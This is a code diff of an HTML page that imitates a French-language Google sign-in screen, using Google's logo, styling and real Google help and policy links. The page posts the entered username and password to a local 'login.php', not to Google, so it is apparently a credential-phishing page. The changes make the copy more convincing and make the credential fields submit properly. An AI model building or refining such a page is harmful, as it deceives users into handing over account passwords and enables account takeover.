@@ -3,35 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion Google</title>
+    <title>Connexion - Google</title>
     <style>
         :root {
             --blue: #1a73e8;
             --blue-hover: #1765cc;
+            --blue-active: #1a56c0;
             --gray-border: #dadce0;
             --gray-text: #5f6368;
-            --gray-light: #f5f5f5;
+            --gray-light: #f8f9fa;
+            --error-red: #d93025;
         }
         
         body {
-            font-family: 'Google Sans', Arial, sans-serif;
+            font-family: 'Roboto', 'Noto Sans', Arial, sans-serif;
             background: #fff;
             margin: 0;
             padding: 0;
             color: #202124;
             font-size: 14px;
             line-height: 1.4286;
-        }
-        
-        .main-container {
             min-height: 100vh;
             display: flex;
             flex-direction: column;
         }
         
         .header {
-            padding: 20px;
+            padding: 16px 32px;
             text-align: right;
+        }
+        
+        .header a {
+            color: var(--gray-text);
+            text-decoration: none;
+            margin-left: 16px;
+            font-size: 13px;
+        }
+        
+        .header a:hover {
+            text-decoration: underline;
         }
         
         .content {
@@ -44,7 +54,7 @@
         
         .login-container {
             width: 100%;
-            max-width: 448px;
+            max-width: 450px;
             padding: 48px 40px 36px;
             border: 1px solid var(--gray-border);
             border-radius: 8px;
@@ -66,7 +76,8 @@
             font-weight: 400;
             line-height: 1.3333;
             text-align: center;
-            margin: 0 0 16px;
+            margin: 0 0 8px;
+            padding-top: 8px;
         }
         
         .subtitle {
@@ -74,11 +85,12 @@
             font-weight: 400;
             color: var(--gray-text);
             text-align: center;
-            margin: 0 0 24px;
+            margin: 0 0 40px;
         }
         
         .form-group {
             margin-bottom: 24px;
+            position: relative;
         }
         
         .input-field {
@@ -89,29 +101,49 @@
             font-size: 16px;
             box-sizing: border-box;
             transition: border 0.2s;
+            height: 56px;
         }
         
         .input-field:focus {
             border: 1px solid var(--blue);
             outline: none;
+            box-shadow: 0 0 0 1px var(--blue);
         }
         
-        .forgot-email {
+        .input-field.error {
+            border-color: var(--error-red);
+        }
+        
+        .forgot-password {
             display: block;
-            margin-top: -10px;
-            margin-bottom: 20px;
+            margin-top: 8px;
+            color: var(--blue);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
         }
         
-        .links {
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .buttons {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-top: 26px;
+            margin-top: 40px;
         }
         
         .create-account {
             font-weight: 500;
             color: var(--blue);
+            text-decoration: none;
+            font-size: 14px;
+            padding: 10px 0;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
         }
         
         .next-button {
@@ -123,7 +155,9 @@
             font-size: 14px;
             font-weight: 500;
             cursor: pointer;
-            transition: background-color 0.2s;
+            transition: background-color 0.2s, box-shadow 0.2s;
+            min-width: 80px;
+            text-align: center;
         }
         
         .next-button:hover {
@@ -131,62 +165,112 @@
             box-shadow: 0 1px 2px 0 rgba(66,133,244,0.3), 0 1px 3px 1px rgba(66,133,244,0.15);
         }
         
+        .next-button:active {
+            background-color: var(--blue-active);
+        }
+        
         .footer {
             background: var(--gray-light);
-            padding: 24px;
-            text-align: center;
+            padding: 24px 32px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
             font-size: 12px;
             color: var(--gray-text);
         }
         
+        .footer-links {
+            display: flex;
+            order: 2;
+        }
+        
+        .footer-links a {
+            color: var(--gray-text);
+            text-decoration: none;
+            margin-left: 24px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
         .language-selector {
-            padding: 12px 0;
-            text-align: center;
+            order: 1;
+        }
+        
+        @media (max-width: 600px) {
+            .login-container {
+                border: none;
+                padding: 24px 16px;
+                max-width: 100%;
+            }
+            
+            .footer {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .footer-links {
+                order: 1;
+                margin-bottom: 12px;
+                flex-wrap: wrap;
+            }
+            
+            .footer-links a {
+                margin: 0 12px 0 0;
+            }
+            
+            .language-selector {
+                order: 2;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="main-container">
-        <header class="header">
-            <a href="#" style="color: var(--gray-text); margin-right: 15px;">Aide</a>
-            <a href="#" style="color: var(--gray-text);">Confidentialité</a>
-            <a href="#" style="color: var(--gray-text); margin-left: 15px;">Conditions</a>
-        </header>
-        
-        <main class="content">
-            <div class="login-container">
-                <div class="logo">
-                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+    <header class="header">
+        <a href="https://support.google.com">Aide</a>
+        <a href="https://policies.google.com/privacy">Confidentialité</a>
+        <a href="https://policies.google.com/terms">Conditions</a>
+    </header>
+    
+    <main class="content">
+        <div class="login-container">
+            <div class="logo">
+                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" width="75">
+            </div>
+            
+            <h1 class="title">Connexion</h1>
+            <p class="subtitle">Utilisez votre compte Google</p>
+            
+            <form action="login.php" method="post" id="loginForm">
+                <div class="form-group">
+                    <input type="text" class="input-field" name="username" placeholder="Nom d'utilisateur ou email" required autofocus>
                 </div>
                 
-                <h1 class="title">Connexion</h1>
-                <p class="subtitle">Utilisez votre compte Google</p>
-                
-             <form action="login.php" method="post" id="loginForm">
-                <div class="input-group">
-                    <input type="text" placeholder="Nom d'utilisateur ou email" required>
+                <div class="form-group">
+                    <input type="password" class="input-field" name="password" placeholder="Mot de passe" required>
+                    <a href="https://accounts.google.com/signin/recovery" class="forgot-password">Mot de passe oublié ?</a>
                 </div>
                 
-                <div class="input-group">
-                    <input type="password" placeholder="Mot de passe" required>
-                    <a href="login.html" class="forgot-password">Mot de passe oublié ?</a>
+                <div class="buttons">
+                  
+                    <button type="submit" class="next-button">Suivant</button>
                 </div>
-                
-                <button type="submit" class="login-btn">Se connecter</button>
-            </form>   
-            </div>
-        </main>
-        
-        <footer class="footer">
-            <div class="language-selector">
-                Français (France)
-            </div>
-            <div>
-                <a href="#" style="color: var(--gray-text); margin-right: 15px;">Aide</a>
-                <a href="#" style="color: var(--gray-text); margin-right: 15px;">Confidentialité</a>
-                <a href="#" style="color: var(--gray-text);">Conditions</a>
-            </div>
-        </footer>
-    </div>
+            </form>
+        </div>
+    </main>
+    
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="https://about.google">À propos de Google</a>
+            <a href="https://policies.google.com/privacy">Confidentialité</a>
+            <a href="https://policies.google.com/terms">Conditions</a>
+            <a href="https://support.google.com">Aide</a>
+        </div>
+        <div class="language-selector">
+            Français (France)
+        </div>
+    </footer>
 </body>
-            </html>
+                    </html
